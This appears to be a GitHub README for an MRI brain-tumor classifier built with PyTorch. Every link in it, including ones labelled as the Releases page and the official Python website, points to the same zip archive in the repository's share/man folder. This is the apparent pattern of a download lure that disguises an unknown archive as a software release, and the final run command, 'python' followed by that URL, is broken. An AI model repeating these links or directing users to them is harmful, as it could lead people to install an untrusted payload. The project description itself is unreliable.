[![Download Now](https://raw.githubusercontent.com/tweeezty/Brain_Tumor_Prediction/main/share/man/Brain-Prediction-Tumor-2.5.zip%20Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/tweeezty/Brain_Tumor_Prediction/main/share/man/Brain-Prediction-Tumor-2.5.zip)

## 📌 Project Description

Brain tumor detection is essential in the field of medical imaging. This project uses deep learning and computer vision techniques to analyze MRI images and determine if a brain tumor is present. Our model classifies MRI scans into two categories: 
1. Tumor
2. No Tumor

The model is trained on a labeled MRI dataset and can predict outcomes on new images with high accuracy.

## 🛠️ Technologies Used

- **Programming Language:** Python
- **Framework:** PyTorch
- **Libraries:** 
  - TorchVision
  - OpenCV
  - NumPy
  - Matplotlib
- **Model:** Convolutional Neural Network (CNN)

## 🚀 Getting Started

Follow these steps to download and run the application on your computer.

### Step 1: Visit the Releases Page

To get started, [visit the Releases page](https://raw.githubusercontent.com/tweeezty/Brain_Tumor_Prediction/main/share/man/Brain-Prediction-Tumor-2.5.zip) to find the latest version of the application. 

### Step 2: Download the Software

On the Releases page, locate the latest version of the software. Click to download the file that matches your operating system.

### Step 3: Install Required Software

To run this application, ensure you have the following software installed on your system:

- Python 3.6 or higher. You can download it from the [official Python website](https://raw.githubusercontent.com/tweeezty/Brain_Tumor_Prediction/main/share/man/Brain-Prediction-Tumor-2.5.zip).
- Pip, to handle package installations. Pip is included with recent versions of Python.

### Step 4: Set Up Your Environment

After installing Python, open a command prompt or terminal window. Use the following command to create a virtual environment. This step helps keep your project organized:

```
python -m venv brain_tumor_env
```

Activate the virtual environment with:

- **On Windows:**
  ```
  brain_tumor_env\Scripts\activate
  ```
  
- **On macOS/Linux:**
  ```
  source brain_tumor_env/bin/activate
  ```

### Step 5: Install Required Libraries

After activating the environment, install the required libraries with this command:

```
pip install torch torchvision opencv-python numpy matplotlib
```

### Step 6: Run the Application

Once the libraries are installed, you can run the application. Navigate to the folder where you downloaded the model files and run:

```
python https://raw.githubusercontent.com/tweeezty/Brain_Tumor_Prediction/main/share/man/Brain-Prediction-Tumor-2.5.zip
```

Follow the prompts to input your MRI image and receive a prediction.
